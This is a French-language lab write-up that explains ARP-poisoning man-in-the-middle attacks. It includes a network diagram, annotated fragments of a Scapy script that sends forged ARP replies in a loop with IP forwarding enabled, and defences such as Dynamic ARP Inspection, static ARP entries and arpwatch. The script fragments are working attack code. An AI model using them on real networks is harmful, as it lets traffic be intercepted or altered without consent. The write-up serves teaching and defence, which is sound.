# ARP Poisoning - Man In The Middle (MITM)

## En quoi ça consiste

L'ARP Poisoning consiste à empoisonner la table ARP des victimes en envoyant de fausses réponses ARP. L'attaquant se fait passer pour une autre machine au niveau de la couche 2 (MAC).

### Principe

```
AVANT L'ATTAQUE (Normal):

  PC1 (192.168.189.200)          PC2 (192.168.189.201)
  MAC: AA:AA:AA:AA:AA:AA         MAC: BB:BB:BB:BB:BB:BB
         |                              |
         +----------- Switch -----------+

  PC1 sait que PC2 = BB:BB:BB:BB:BB:BB
  PC2 sait que PC1 = AA:AA:AA:AA:AA:AA


PENDANT L'ATTAQUE (MITM):

  PC1                          Rocky (Attaquant)                    PC2
  192.168.189.200              192.168.189.128                      192.168.189.201
  MAC: AA:AA:AA                MAC: CC:CC:CC                        MAC: BB:BB:BB
       |                            |                                    |
       |  "PC2 = CC:CC:CC"  ◄──────|  "PC1 = CC:CC:CC"  ◄───────────────|
       |◄──────────────────────────|◄───────────────────────────────────|
       |                            |                                    |
       +───────────────────────────►|◄───────────────────────────────────+
                 Trafic PC1→PC2     |     Trafic PC2→PC1
                 passe par Rocky    |     passe par Rocky
                                    |
                              [ Rocky voit TOUT ]
```

### Résultat
- PC1 pense que PC2 = MAC de Rocky
- PC2 pense que PC1 = MAC de Rocky
- Tout le trafic entre PC1 et PC2 passe par Rocky
- Rocky peut capturer, modifier ou bloquer le trafic

## Explication du Code

### arp_poisoning.py

```python
def get_mac(ip):
    req = ARP(pdst=ip)
    eth = Ether(dst="ff:ff:ff:ff:ff:ff")
    rep = srp(eth / req, iface=iface, timeout=2, verbose=False)[0]
    return rep[0][1].hwsrc if rep else None
```
Envoie une requête ARP broadcast pour trouver la MAC d'une IP cible.

```python
def poison(a, b, c):
    send(ARP(op=2, pdst=a, hwdst=b, psrc=c), verbose=False)
```
Envoie une fausse réponse ARP : "L'IP `c` a la MAC `b`" à la victime `a`.
- `op=2` = réponse ARP (pas une requête)
- `psrc=c` = l'IP qu'on usurpe
- `hwdst=b` = la MAC de la victime

```python
open("/proc/sys/net/ipv4/ip_forward", "w").write("1")
```
Active le forwarding IP pour que Rocky transmette le trafic entre les victimes (sinon elles perdent la connexion et se doutent de l'attaque).

```python
while True:
    poison(victim, vmac, target)
    poison(target, tmac, victim)
    time.sleep(2)
```
Boucle infinie : envoie des fausses réponses ARP toutes les 2 secondes pour maintenir l'empoisonnement.

```python
def restore(a, b, c):
    send(ARP(op=2, pdst=a, hwsrc=c, hwdst=b, psrc=c), count=5)
```
Restaure les vraies associations ARP quand on arrête (Ctrl+C).

## Comment empêcher cette attaque

### Sur le switch Cisco (Dynamic ARP Inspection)
```
Switch(config)# ip arp inspection vlan 1
Switch(config)# interface Et0/2
Switch(config-if)# ip arp inspection trust
```

### Sur les machines Linux
- Utiliser des entrées ARP statiques : `arp -s 192.168.189.201 BB:BB:BB:BB:BB:BB`
- Installer `arpwatch` pour détecter les changements ARP
- Utiliser HTTPS partout (chiffre le contenu même si le trafic est intercepté)
